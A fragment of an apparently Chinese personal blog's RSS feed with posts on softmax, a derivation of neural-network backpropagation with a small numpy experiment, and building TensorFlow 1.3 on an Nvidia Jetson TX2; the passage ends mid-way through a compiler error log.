&lt;p&gt;&lt;img src=&#34;http://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2017/09/softmax/softmax-cost.png&#34; alt=&#34;训练代价&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/singleye/MachineLearning/blob/master/NeuralNetwork/Softmax/experiment-softmax.ipynb&#34;&gt;完整代码&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;参考&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%8f%82%e8%80%83&#34;&gt;
        ##
    &lt;/a&gt;
    参考
&lt;/div&gt;
&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://neuralnetworksanddeeplearning.com/chap3.html#softmax&#34;&gt;http://neuralnetworksanddeeplearning.com/chap3.html#softmax&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://zhuanlan.zhihu.com/p/25723112&#34;&gt;https://zhuanlan.zhihu.com/p/25723112&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://colah.github.io/posts/2015-09-Visual-Information/&#34;&gt;http://colah.github.io/posts/2015-09-Visual-Information/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>神经网络之反向传播算法</title>
      <link>/2017/09/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E4%B9%8B%E5%8F%8D%E5%90%91%E4%BC%A0%E6%92%AD%E7%AE%97%E6%B3%95/</link>
      <pubDate>Mon, 25 Sep 2017 15:44:00 +0000</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2017/09/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E4%B9%8B%E5%8F%8D%E5%90%91%E4%BC%A0%E6%92%AD%E7%AE%97%E6%B3%95/</guid>
      <description>&lt;!-- more /--&gt;
&lt;p&gt;之前使用神经网络算法的时候并没有认真总结关键的算法，虽然可以用但总觉得不爽，于是这两天对神经网络算法中的反向传播（Back Propagation）进行了推导。即理解了算法的数学本质，也对神经网络算法的工程特性有了深刻体会，工程算法真的是以解决问题为驱动的，追求的是解决问题的实用性。&lt;/p&gt;
&lt;h1 id=&#34;神经网络&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e7%a5%9e%e7%bb%8f%e7%bd%91%e7%bb%9c&#34;&gt;
        ##
    &lt;/a&gt;
    神经网络
&lt;/div&gt;
&lt;/h1&gt;
&lt;h2 id=&#34;网络拓扑&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e7%bd%91%e7%bb%9c%e6%8b%93%e6%89%91&#34;&gt;
        #
    &lt;/a&gt;
    网络拓扑
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;http://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2017/09/BP-experiment/neural-network.jpg&#34; alt=&#34;神经网络&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;神经元&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e7%a5%9e%e7%bb%8f%e5%85%83&#34;&gt;
        #
    &lt;/a&gt;
    神经元
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;神经元是神经网络的基本构成，上图的每一个圆圈代表了一个神经元。每一个神经元有一个输入和一个输出，神经元的作用是对输入值进行计算。下图是一个神经元的简单示意图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2017/09/BP-experiment/neuron.jpg&#34; alt=&#34;神经元&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;该神经元的输出：$ a=f(z)=sigmoid(z) $&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;神经元输入&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e7%a5%9e%e7%bb%8f%e5%85%83%e8%be%93%e5%85%a5&#34;&gt;
        ##
    &lt;/a&gt;
    神经元输入
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;在一个复杂点的神经网络中，一个神经元接收来自多个前级神经元的激活输出，并进行加权相加后产生该神经元的输入值，这个过程示意图如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2017/09/BP-experiment/neuron-input.jpg&#34; alt=&#34;neuron-input&#34;&gt;&lt;/p&gt;
&lt;p&gt;定义第 $ l^{th} $ 层第 $ j^{th} $ 个神经元的输入：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2017/09/BP-experiment/neuron-input-equation.png&#34; alt=&#34;神经元输入&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;神经元加权&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e7%a5%9e%e7%bb%8f%e5%85%83%e5%8a%a0%e6%9d%83&#34;&gt;
        ##
    &lt;/a&gt;
    神经元加权
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;神经元的加权结构可以看下面的示意图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2017/09/BP-experiment/neuron-weight.jpg&#34; alt=&#34;neuron-weight&#34;&gt;&lt;/p&gt;
&lt;p&gt;注，第一层神经元的输入就是采样数据，不需要计算z值，这层采样数据直接通过权重计算输入到第二层的神经元。&lt;/p&gt;
&lt;h1 id=&#34;反向传播算法&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%8f%8d%e5%90%91%e4%bc%a0%e6%92%ad%e7%ae%97%e6%b3%95&#34;&gt;
        ##
    &lt;/a&gt;
    反向传播算法
&lt;/div&gt;
&lt;/h1&gt;
&lt;h2 id=&#34;代价函数&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e4%bb%a3%e4%bb%b7%e5%87%bd%e6%95%b0&#34;&gt;
        #
    &lt;/a&gt;
    代价函数
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;定义代价函数：$ cost = {1 \over 2} \sum (y^{(i)} - a^{(i)})^2 $&lt;/p&gt;
&lt;h2 id=&#34;神经元错误量--delta_jl-&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e7%a5%9e%e7%bb%8f%e5%85%83%e9%94%99%e8%af%af%e9%87%8f--delta_jl-&#34;&gt;
        #
    &lt;/a&gt;
    神经元错误量 $ \delta_j^{(l)} $
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;每个神经元的输入记为&amp;rsquo;z&amp;rsquo;，经过激活函数&amp;rsquo;f(z)&amp;lsquo;生成激活值&amp;rsquo;a&amp;rsquo;，通常情况下激活函数使用sigmoid()。那么假设对于每个神经元的输入&amp;rsquo;z&amp;rsquo;做一点微小的改变记为 $ \Delta z $，由这个改变引起的代价变化记为这个神经元的错误量 $ \delta_j^{(l)} $，从这个定义可以看出来这是一个代价函数相对于神经元的输入&amp;rsquo;z&amp;rsquo;的偏导数。&lt;/p&gt;
&lt;p&gt;定义 $ \delta_j^{(l)} $ 为 $ l^{th} $ 层中的第 $ j^{th} $ 个神经元的错误量，记作：$ \delta_j^{(l)} =\frac{\partial C}{\partial z_j^{(l)}} $&lt;/p&gt;
&lt;p&gt;经过数学推导可以得出结论：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;最后一层（L层）第j个神经元的错误量：&lt;/li&gt;
&lt;/ul&gt;
$$ \delta_j^{(L)} = -(y-a_j^{(L)}) \bigodot [a_j^{(L)}(1-a_j^{(L)})] $$
&lt;p&gt;简单推导若成如下：&lt;/p&gt;
$$ \delta_j^{(L)} = \frac{\partial C}{\partial z_j^{(l)}} $$
$$ \frac{\partial C}{\partial z_j^{(l)}} = \frac{\partial C}{\partial a_j^{(L)}} \frac{\partial a_j^{(L)}}{\partial z_j^{(L)}} $$
$$ \frac{\partial C}{\partial a_j^{(L)}} \frac{\partial a_j^{(L)}}{\partial z_j^{(L)}} = -(y-a_j^{(L)}) \bigodot [a_j^{(L)}(1-a_j^{(L)})] $$
&lt;p&gt;y：采样的结果&lt;/p&gt;
&lt;p&gt;$ a_j^{(L)} $：样本输入计算的结果&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;其余各层(l层)第j个神经元的错误量：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;http://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2017/09/BP-experiment/delta-layer-l.png&#34; alt=&#34;delta-equation&#34;&gt;&lt;/p&gt;
&lt;p&gt;因为首先可以算出来每一层的激活量 $ a_j^{(l)} $，那么可以看出来除了最后一层外的其他层的错误量可以靠后面一层的错误量计算出来，直至推算到最后一层 $ \delta_j^{(L)} $。&lt;/p&gt;
&lt;p&gt;因此反向传播算法也就是从最后一层往前一层一层计算的过程，与计算激活量的方向正好相反，因此得名反向传播。&lt;/p&gt;
&lt;h2 id=&#34;权重调整及偏置调整&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e6%9d%83%e9%87%8d%e8%b0%83%e6%95%b4%e5%8f%8a%e5%81%8f%e7%bd%ae%e8%b0%83%e6%95%b4&#34;&gt;
        #
    &lt;/a&gt;
    权重调整及偏置调整
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;观察每个神经元的输入可以发现神经网络计算过程中最重要的是要确定两个量权重w和偏置b。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2017/09/BP-experiment/neuron-input-equation.png&#34; alt=&#34;神经元输入&#34;&gt;&lt;/p&gt;
&lt;p&gt;仿照错误量计算方法将问题进行一下转化，是否可以计算出代价函数相对于权重和偏置的变化速率（偏微分），然后通过乘以一个小数字（学习速率）来一点一点降低代价函数的输出，从而逼近最终需要的权重及偏置值呢？&lt;/p&gt;
&lt;p&gt;因此可以将问题转化为求 $ \frac{\partial C}{\partial w_{jk}^{(l)}} $ 和 $ \frac{\partial C}{\partial b_j^{(l)}} $&lt;/p&gt;
&lt;p&gt;通过推导可以得出：&lt;/p&gt;
$$ \frac{\partial C}{\partial w_{jk}^{(l)}} = \delta_j^{(l+1)} a_k^{(l)} $$
$$ \frac{\partial C}{\partial b_{jk}^{(l)}} = \delta_j^{(l)} $$
&lt;p&gt;基于前面对于错误量 $ \delta_j^{(l)} $ 就可以非常简单的得到相应的结果。&lt;/p&gt;
&lt;p&gt;那么最终对于权重及偏置的调整可以这样做：&lt;/p&gt;
$$ w = w-\eta \frac{\partial C}{\partial w_{jk}^{(l)}} $$
$$ b = b-\eta \frac{\partial C}{\partial b_{jk}^{(l)}} $$
&lt;p&gt;其中 $ \eta $ 是一个非常小的正数，这个数字也被叫做“学习速率”，通过这个值的调整可以控制拟合的速度。&lt;/p&gt;
&lt;h1 id=&#34;推导过程&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e6%8e%a8%e5%af%bc%e8%bf%87%e7%a8%8b&#34;&gt;
        ##
    &lt;/a&gt;
    推导过程
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;前面的部分直接使用了结论，实际推到过程比较啰嗦，markdown直接编写公式也不方便，索性把推到过程的草稿贴出来参考好了&lt;/p&gt;
&lt;p&gt;:-)&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2017/09/BP-experiment/derivation-process.JPG?x-oss-process=style/png2jpg&#34; alt=&#34;推导过程&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;实验代码&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%ae%9e%e9%aa%8c%e4%bb%a3%e7%a0%81&#34;&gt;
        ##
    &lt;/a&gt;
    实验代码
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;做一个简单的神经网络实验，网络设计为3层，第一层对应3个输入，第二层用4个神经元，第三层为输出层使用1个神经元。&lt;/p&gt;
&lt;p&gt;网络初始化过程如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# network design:
# input(layer_1): 3 nodes
#    weights: 3x4 matrix
# layer_2: 4 nodes
#    weights: 4x1 matrix
# output: 1 node

# create training data
input = np.array([[0, 0, 1],
                 [0, 1, 0],
                 [0, 1, 1],
                 [1, 0, 0],
                 [1, 0, 1]])

# create the label related with the input training data
output = np.array([[0],
                  [1],
                  [0],
                  [1],
                  [1]])

# initialize random weight
weight_layer_1 = np.random.rand(3, 4)
weight_layer_2 = np.random.rand(4, 1)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;训练过程主要代码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# x/y is for drawing chart
x=[]
y=[]

# learning rate
eta = 0.1

loop = 0
while loop &amp;lt; 50000:
    # feed forward calculation
    z_layer_2 = np.dot(input, weight_layer_1)
    a_layer_2 = sigmoid(z_layer_2)

    z_layer_3 = np.dot(a_layer_2, weight_layer_2)
    a_layer_3 = sigmoid(z_layer_3)
    
    if loop % 100 == 0:
        # calculate the cost
        c = cost(output, a_layer_3)
        print &amp;quot;[%d] Cost: %f&amp;quot; % (loop, c)
        print &amp;quot;Perception: &amp;quot;, a_layer_3
        x.append(loop)
        y.append(c)
    loop += 1
    
    # back propagation
    # calculate delta_3
    delta_layer_3 = cost_derivative(output, a_layer_3)*deriv_z(a_layer_3)
    
    # calculate delta_2
    delta_layer_2 = np.dot(delta_layer_3, weight_layer_2.T)*deriv_z(a_layer_2)
    
    # there is NO delta_layer_1, since layer1 is the input layer

    # calculate new weight for layer 2
    weight_layer_2 -= eta*np.dot(a_layer_2.T, delta_layer_3)
    
    # calculate new weight for layer 1
    weight_layer_1 -= eta*np.dot(input.T, delta_layer_2)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上面代码可以观察到每100次计算修正后的代价函数输出以及预测值，可以发现代价值在逐渐趋近于0，说明误差在降低，预测值越来越接近实际采样的数值。&lt;/p&gt;
&lt;p&gt;为了更加清晰的看到这个过程，把x/y输出在图上进行查看，可以观察到拟合过程，并且可以看到拟合的速度变化情况。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import matplotlib.pyplot as plt
plt.plot(x, y)
plt.xlabel(&amp;quot;Epoch&amp;quot;)
plt.ylabel(&amp;quot;Cost&amp;quot;)
plt.show()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;http://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2017/09/BP-experiment/cost-epoch.png&#34; alt=&#34;拟合过程&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/singleye/MachineLearning/blob/master/NeuralNetwork/BackPropagation/experiment-back-propagation.ipynb&#34;&gt;完整代码&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;参考&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%8f%82%e8%80%83&#34;&gt;
        ##
    &lt;/a&gt;
    参考
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=mOmkv5SI9hU&amp;amp;list=PLLssT5z_DsK-h9vYZkQkYNWcItqhlRJLN&amp;amp;index=52&#34;&gt;https://www.youtube.com/watch?v=mOmkv5SI9hU&amp;amp;list=PLLssT5z_DsK-h9vYZkQkYNWcItqhlRJLN&amp;amp;index=52&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://www.cnblogs.com/charlotte77/p/5629865.html&#34;&gt;http://www.cnblogs.com/charlotte77/p/5629865.html&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>在 Nvidia Jetson TX2 上编译安装tensorflow</title>
      <link>/2017/09/%E5%9C%A8-nvidia-jetson-tx2-%E4%B8%8A%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85tensorflow/</link>
      <pubDate>Thu, 14 Sep 2017 00:22:00 +0000</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2017/09/%E5%9C%A8-nvidia-jetson-tx2-%E4%B8%8A%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85tensorflow/</guid>
      <description>&lt;!-- more /--&gt;
&lt;p&gt;&lt;img src=&#34;http://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2017/09/tensorflow/IMG_6135.JPG?x-oss-process=style/png2jpg&#34; alt=&#34;TX2&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;系统环境&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e7%b3%bb%e7%bb%9f%e7%8e%af%e5%a2%83&#34;&gt;
        ##
    &lt;/a&gt;
    系统环境
&lt;/div&gt;
&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Jetpack：v3.0&lt;/li&gt;
&lt;li&gt;CUDA：8.0&lt;/li&gt;
&lt;li&gt;cuDNN：5.1.10&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;编译安装bazel&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e7%bc%96%e8%af%91%e5%ae%89%e8%a3%85bazel&#34;&gt;
        ##
    &lt;/a&gt;
    编译安装bazel
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;bazel是google开发的一套开发管理工具，功能类似makefile和maven，特点是速度快，编译tensorflow时需要用到这个工具。&lt;/p&gt;
&lt;p&gt;在TX2上安装bazel需要对bazel源代码做一点修改以支持该平台。下载代码后修改文件 &amp;ldquo;bazel/src/main/java/com/google/devtools/build/lib/util/CPU.java&amp;rdquo;，修改如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public enum CPU {
  X86_32(&amp;quot;x86_32&amp;quot;, ImmutableSet.of(&amp;quot;i386&amp;quot;, &amp;quot;i486&amp;quot;, &amp;quot;i586&amp;quot;, &amp;quot;i686&amp;quot;, &amp;quot;i786&amp;quot;, &amp;quot;x86&amp;quot;)),
  X86_64(&amp;quot;x86_64&amp;quot;, ImmutableSet.of(&amp;quot;amd64&amp;quot;, &amp;quot;x86_64&amp;quot;, &amp;quot;x64&amp;quot;)),
  PPC(&amp;quot;ppc&amp;quot;, ImmutableSet.of(&amp;quot;ppc&amp;quot;, &amp;quot;ppc64&amp;quot;, &amp;quot;ppc64le&amp;quot;)),
-  ARM(&amp;quot;arm&amp;quot;, ImmutableSet.of(&amp;quot;arm&amp;quot;, &amp;quot;armv7l&amp;quot;)),
+  ARM(&amp;quot;arm&amp;quot;, ImmutableSet.of(&amp;quot;arm&amp;quot;, &amp;quot;armv7l&amp;quot;, &amp;quot;aarch64&amp;quot;)),
  S390X(&amp;quot;s390x&amp;quot;, ImmutableSet.of(&amp;quot;s390x&amp;quot;, &amp;quot;s390&amp;quot;)),
  UNKNOWN(&amp;quot;unknown&amp;quot;, ImmutableSet.&amp;lt;String&amp;gt;of());
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;修改好之后在代码目录运行 &amp;ldquo;compile.sh&amp;rdquo; 进行编译，编译好后将程序拷贝到执行环境：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ sudo cp output/bazel /usr/local/bin
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;安装tensorflow&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%ae%89%e8%a3%85tensorflow&#34;&gt;
        ##
    &lt;/a&gt;
    安装tensorflow
&lt;/div&gt;
&lt;/h1&gt;
&lt;h2 id=&#34;下载tensorflow源码&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e4%b8%8b%e8%bd%bdtensorflow%e6%ba%90%e7%a0%81&#34;&gt;
        #
    &lt;/a&gt;
    下载tensorflow源码
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;写这篇文章的时候tensorflow已经发展到了v1.3，下载release版本代码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ wget https://github.com/tensorflow/tensorflow/archive/v1.3.0.tar.gz
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;编译tensorflow&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e7%bc%96%e8%af%91tensorflow&#34;&gt;
        #
    &lt;/a&gt;
    编译tensorflow
&lt;/div&gt;
&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;配置configure&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;首先configure编译环境：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;nvidia@tegra-ubuntu:~/tensorflow/tensorflow-1.3.0$ ./configure
You have bazel 0.4.5- installed.
Please specify the location of python. [Default is /usr/bin/python]:
Found possible Python library paths:
  /usr/local/lib/python2.7/dist-packages
  /usr/lib/python2.7/dist-packages
Please input the desired Python library path to use.  Default is [/usr/local/lib/python2.7/dist-packages]

Using python library path: /usr/local/lib/python2.7/dist-packages
Do you wish to build TensorFlow with MKL support? [y/N]
No MKL support will be enabled for TensorFlow
Please specify optimization flags to use during compilation when bazel option &amp;quot;--config=opt&amp;quot; is specified [Default is -march=native]:
Do you wish to use jemalloc as the malloc implementation? [Y/n]
jemalloc enabled
Do you wish to build TensorFlow with Google Cloud Platform support? [y/N]
No Google Cloud Platform support will be enabled for TensorFlow
Do you wish to build TensorFlow with Hadoop File System support? [y/N]
No Hadoop File System support will be enabled for TensorFlow
Do you wish to build TensorFlow with the XLA just-in-time compiler (experimental)? [y/N]
No XLA support will be enabled for TensorFlow
Do you wish to build TensorFlow with VERBS support? [y/N]
No VERBS support will be enabled for TensorFlow
Do you wish to build TensorFlow with OpenCL support? [y/N]
No OpenCL support will be enabled for TensorFlow
Do you wish to build TensorFlow with CUDA support? [y/N] y
CUDA support will be enabled for TensorFlow
Do you want to use clang as CUDA compiler? [y/N]
nvcc will be used as CUDA compiler
Please specify the CUDA SDK version you want to use, e.g. 7.0. [Leave empty to default to CUDA 8.0]: 8.0
Please specify the location where CUDA 8.0 toolkit is installed. Refer to README.md for more details. [Default is /usr/local/cuda]:
Please specify which gcc should be used by nvcc as the host compiler. [Default is /usr/bin/gcc]:
Please specify the cuDNN version you want to use. [Leave empty to default to cuDNN 6.0]: 5.1.10
Please specify the location where cuDNN 5.1.10 library is installed. Refer to README.md for more details. [Default is /usr/local/cuda]:
./configure: line 669: /usr/local/cuda/extras/demo_suite/deviceQuery: No such file or directory
Please specify a list of comma-separated Cuda compute capabilities you want to build with.
You can find the compute capability of your device at: https://developer.nvidia.com/cuda-gpus.
Please note that each additional compute capability significantly increases your build time and binary size.
[Default is: &amp;quot;3.5,5.2&amp;quot;]: 6.2
Do you wish to build TensorFlow with MPI support? [y/N]
MPI support will not be enabled for TensorFlow
Configuration finished
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里主要说一下配置&amp;quot;compute capability&amp;quot;的方法，默认值为&amp;quot;3.5,5.2&amp;quot;，但到底该填写什么值可以通过一个jetpack自带的程序查询出来：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;nvidia@tegra-ubuntu:~/NVIDIA_CUDA-8.0_Samples/1_Utilities/deviceQuery$ ./deviceQuery
./deviceQuery Starting...

 CUDA Device Query (Runtime API) version (CUDART static linking)

Detected 1 CUDA Capable device(s)

Device 0: &amp;quot;GP10B&amp;quot;
  CUDA Driver Version / Runtime Version          8.5 / 8.0
  CUDA Capability Major/Minor version number:    6.2
  Total amount of global memory:                 7854 MBytes (8235577344 bytes)
  ( 2) Multiprocessors, (128) CUDA Cores/MP:     256 CUDA Cores
  GPU Max Clock rate:                            1301 MHz (1.30 GHz)
  Memory Clock rate:                             13 Mhz
  Memory Bus Width:                              64-bit
  L2 Cache Size:                                 524288 bytes
  Maximum Texture Dimension Size (x,y,z)         1D=(131072), 2D=(131072, 65536), 3D=(16384, 16384, 16384)
  Maximum Layered 1D Texture Size, (num) layers  1D=(32768), 2048 layers
  Maximum Layered 2D Texture Size, (num) layers  2D=(32768, 32768), 2048 layers
  Total amount of constant memory:               65536 bytes
  Total amount of shared memory per block:       49152 bytes
  Total number of registers available per block: 32768
  Warp size:                                     32
  Maximum number of threads per multiprocessor:  2048
  Maximum number of threads per block:           1024
  Max dimension size of a thread block (x,y,z): (1024, 1024, 64)
  Max dimension size of a grid size    (x,y,z): (2147483647, 65535, 65535)
  Maximum memory pitch:                          2147483647 bytes
  Texture alignment:                             512 bytes
  Concurrent copy and kernel execution:          Yes with 1 copy engine(s)
  Run time limit on kernels:                     No
  Integrated GPU sharing Host Memory:            Yes
  Support host page-locked memory mapping:       Yes
  Alignment requirement for Surfaces:            Yes
  Device has ECC support:                        Disabled
  Device supports Unified Addressing (UVA):      Yes
  Device PCI Domain ID / Bus ID / location ID:   0 / 0 / 0
  Compute Mode:
     &amp;lt; Default (multiple host threads can use ::cudaSetDevice() with device simultaneously) &amp;gt;

deviceQuery, CUDA Driver = CUDART, CUDA Driver Version = 8.5, CUDA Runtime Version = 8.0, NumDevs = 1, Device0 = GP10B
Result = PASS
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;主意上面的内容中有下面一行内容，这行的内容就是&amp;quot;compute capability&amp;quot;：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;CUDA Capability Major/Minor version number:    6.2
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;编译tensorflow&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;执行下面的命令进行编译，并指定使用cuda&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;nvidia@tegra-ubuntu:~/tensorflow$ bazel build --config=opt --config=cuda //tensorflow/tools/pip_package:build_pip_package
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;生成pip安装包&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;执行完之后会生成pip包生成脚本 &amp;ldquo;./bazel-bin/tensorflow/tools/pip_package/build_pip_package&amp;rdquo;，可以执行这个脚本生成pip安装包：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;nvidia@tegra-ubuntu:~/tensorflow/tensorflow-1.3.0$ ./bazel-bin/tensorflow/tools/pip_package/build_pip_package ~/tensorflow
Wed Sep 13 14:41:13 UTC 2017 : === Using tmpdir: /tmp/tmp.F109O2nAzd
~/tensorflow/tensorflow-1.3.0/bazel-bin/tensorflow/tools/pip_package/build_pip_package.runfiles ~/tensorflow/tensorflow-1.3.0
~/tensorflow/tensorflow-1.3.0
/tmp/tmp.F109O2nAzd ~/tensorflow/tensorflow-1.3.0
Wed Sep 13 14:41:20 UTC 2017 : === Building wheel
warning: no files found matching &#39;*.dll&#39; under directory &#39;*&#39;
warning: no files found matching &#39;*.lib&#39; under directory &#39;*&#39;
warning: no files found matching &#39;*.h&#39; under directory &#39;tensorflow/include/tensorflow&#39;
warning: no files found matching &#39;*&#39; under directory &#39;tensorflow/include/Eigen&#39;
warning: no files found matching &#39;*&#39; under directory &#39;tensorflow/include/external&#39;
warning: no files found matching &#39;*.h&#39; under directory &#39;tensorflow/include/google&#39;
warning: no files found matching &#39;*&#39; under directory &#39;tensorflow/include/third_party&#39;
warning: no files found matching &#39;*&#39; under directory &#39;tensorflow/include/unsupported&#39;
~/tensorflow/tensorflow-1.3.0
Wed Sep 13 14:41:52 UTC 2017 : === Output wheel file is in: /home/nvidia/tensorflow
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;安装tensorflow&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;执行下面的命令安装：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ pip install tensorflow-1.3.0-cp27-cp27mu-linux_aarch64.whl
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;eigen导致编译错误处理&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#eigen%e5%af%bc%e8%87%b4%e7%bc%96%e8%af%91%e9%94%99%e8%af%af%e5%a4%84%e7%90%86&#34;&gt;
        ##
    &lt;/a&gt;
    eigen导致编译错误处理
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;在编译tensorflow的过程中碰到了几个问题，主要是由于eigen引起。&lt;/p&gt;
&lt;h2 id=&#34;错误1-jacobih-has-no-member-named-pmul&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e9%94%99%e8%af%af1-jacobih-has-no-member-named-pmul&#34;&gt;
        #
    &lt;/a&gt;
    错误1: Jacobi.h has no member named &amp;lsquo;pmul&amp;rsquo;
&lt;/div&gt;
&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;...

In file included from external/eigen_archive/Eigen/Jacobi:27:0,
                 from external/eigen_archive/Eigen/Eigenvalues:16,
                 from ./third_party/eigen3/Eigen/Eigenvalues:1,
                 from tensorflow/core/kernels/self_adjoint_eig_v2_op.cc:19:
external/eigen_archive/Eigen/src/Jacobi/Jacobi.h: In instantiation of &#39;void Eigen::internal::apply_rotation_in_the_plane(Eigen::DenseBase&amp;lt;Derived&amp;gt;&amp;amp;, Eigen::DenseBase&amp;lt;Derived&amp;gt;&amp;amp;, const Eigen::J
acobiRotation&amp;lt;OtherScalar&amp;gt;&amp;amp;) [with VectorX = Eigen::Block&amp;lt;Eigen::Map&amp;lt;Eigen::Matrix&amp;lt;std::complex&amp;lt;float&amp;gt;, -1, -1&amp;gt;, 0, Eigen::Stride&amp;lt;0, 0&amp;gt; &amp;gt;, -1, 1, true&amp;gt;; VectorY = Eigen::Block&amp;lt;Eigen::Map&amp;lt;Eige
